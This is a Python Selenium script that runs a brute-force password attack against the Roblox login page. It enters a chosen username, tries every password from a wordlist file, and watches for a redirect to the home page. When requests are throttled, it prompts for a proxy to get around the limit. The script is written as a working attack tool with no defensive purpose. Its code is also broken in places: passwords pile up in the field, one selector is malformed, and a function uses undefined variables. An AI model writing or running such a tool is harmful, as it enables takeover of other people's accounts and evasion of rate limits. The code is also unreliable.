from selenium import webdriver
from selenium.webdriver.chrome.options import Options
from selenium.webdriver.common.by import By
from selenium.webdriver.support.ui import WebDriverWait
from selenium.webdriver.support import expected_conditions as EC
import sys
import requests
from webdriver_manager.chrome import ChromeDriverManager
import time

def main():
    # Set up Headless Chrome
    chrome_options = Options()
    chrome_options.add_argument("--headless")
    chrome_options.add_argument("--disable-gpu")
    chrome_options.add_argument("--no-sandbox")
    driver = webdriver.Chrome(options=chrome_options)

    # Get the Roblox login page
    driver.get("https://www.roblox.com/login")

    # Get the user-specified username
    username = input("Username: ")

    # Read the passwords from the password_list.txt file
    with open("Downloads/password_list.txt", "r") as f:
        passwords = [line.strip() for line in f.readlines()]

    # Find the username and password textboxes
    username_input = driver.find_element(By.NAME, 'username')
    password_input = driver.find_element(By.NAME, 'password')

    # Enter the username
    username_input.send_keys(username)

    # Try each password
    for password in passwords:
        # Enter the password
        password_input.send_keys(password)

        # Find the login button and click it
        try:
            login_button = WebDriverWait(driver, 10).until(EC.presence_of_element_located((By.CLASS_NAME, 'btn-full-width login-button btn-secondary-md')))
            login_button.click()
        except:
            print("Oops! The response was not the homepage! Trying again...")
            continue

        # Wait for the response
        time.sleep(2)

        # Check if the response is the homepage
        if driver.current_url == "https://www.roblox.com/home":
            print(f"Yay! You successfully logged in as {username}.")
            sys.exit(0)

    # If no password worked, print an error message
    print("Oops! The password list is empty right now!")

    # Check if the status code is 429
    if driver.execute_script("return navigator.webdriver"):
        print("Oops! You are making too much requests! You can try using a proxy to make more requests:")
        ip = input("IP: ")
        port = input("Port: ")
        set_proxy(driver, ip, port)

def set_proxy(driver, ip, port):
    # Set the proxy for the Chrome driver
    chrome_options = Options()
    chrome_options.add_argument("--proxy-server=http=" + ip + ":" + port)
    driver.quit()
    driver = webdriver.Chrome(options=chrome_options)
    driver.get("https://www.roblox.com/login")
    username_input = driver.find_element(By.NAME, 'username')
    password_input = driver.find_element(By.NAME, 'password')
    username_input.send_keys(username)
    password_input.send_keys(password)

if __name__ == "__main__":
    main()